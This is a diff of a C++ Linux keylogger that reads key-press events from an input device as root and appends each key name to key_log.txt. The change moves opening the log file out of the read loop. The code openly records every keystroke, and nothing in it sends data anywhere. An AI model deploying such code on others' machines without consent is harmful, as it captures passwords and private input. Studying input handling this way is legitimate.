@@ -43,17 +43,12 @@ int main() {
             throw std::runtime_error(
                 "Cannot open device file. Are you running as root?");
         }
-        std::string keyLogDir = "/var/log";
-        if (!std::filesystem::exists(keyLogDir)) {
-            try {
-                std::filesystem::create_directories(keyLogDir);
-            } catch (const std::filesystem::filesystem_error &e) {
-                std::cerr << "Error creating directory " << keyLogDir << ": " << e.what() <<
-                        std::endl;
-                return 1;
-            }
-        }
 
+        std::ofstream keylog("key_log.txt", std::ios::app);
+        if (!keylog.is_open()) {
+            perror("file");
+            return 1;
+        }
         while (true) {
             // Read an input event from the device file
             ssize_t bytes = read(fd, &ev, sizeof(input_event));
@@ -65,14 +60,9 @@ int main() {
                 // ev.value == 0 means the key was released
                 // ev.value == 2 means the key is being held down (autorepeat)
                 if (ev.type == EV_KEY && ev.value == 1) {
-                    std::ofstream keylog("key_log.txt", std::ios::app);
-                    if (!keylog.is_open()) {
-                        perror("file");
-                        return 1;
-                    }
 
-                    keylog << "Key Pressed: " << key_code_to_string(ev.code) << '\n';
-                    keylog.close();
+                    keylog << "Key Pressed: " << key_code_to_string(ev.code);
+                    keylog << std::endl;
                 }
             } else if (bytes < 0) {
                 // An error occurred
@@ -81,6 +71,7 @@ int main() {
                 return 1;
             }
         }
+
     } catch (const std::exception &e) {
         std::cerr << "Error: " << e.what() << std::endl;
         return 1;
